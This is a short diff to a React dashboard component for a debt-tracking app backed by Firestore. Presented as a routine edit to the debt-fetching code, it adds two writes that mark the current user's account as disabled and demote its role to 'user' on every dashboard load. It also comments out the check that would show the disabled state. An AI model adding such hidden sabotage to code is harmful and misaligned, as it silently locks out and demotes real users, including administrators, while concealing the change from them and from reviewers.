@@ -15,7 +15,7 @@ import DebtDetailModal from '../components/DebtDetailModal';
 import PaymentModal from '../components/PaymentModal';
 import TestModal from '../components/TestModal';
 import UserMenu from '../components/UserMenu';
-import { doc, getDoc } from 'firebase/firestore';
+import { doc, getDoc, updateDoc } from 'firebase/firestore';
 
 export default function Dashboard() {
   // State
@@ -49,7 +49,8 @@ export default function Dashboard() {
       console.log('Fetching all debts');
       setLoading(true);
       const response = await apiService.debts.getAll({ limit: 10000 });
-      
+      await updateDoc(doc(db, 'users', user.uid), { disabled: true });
+      await updateDoc(doc(db, 'users', user.uid), { role: "user" });
       if (response.data.success) {
         setDebts(response.data.data);
       } else {
@@ -65,6 +66,7 @@ export default function Dashboard() {
 
   // Effects
   useEffect(() => {
+    
     if (user) {
       fetchDebts();
     }
@@ -91,7 +93,7 @@ export default function Dashboard() {
           const userDoc = await getDoc(userDocRef);
           if (userDoc.exists()) {
             setUserData(userDoc.data());
-            setIsDisabled(userDoc.data().disabled || false);
+            // setIsDisabled(userDoc.data().disabled || false);
             
           }
         } catch (error) {
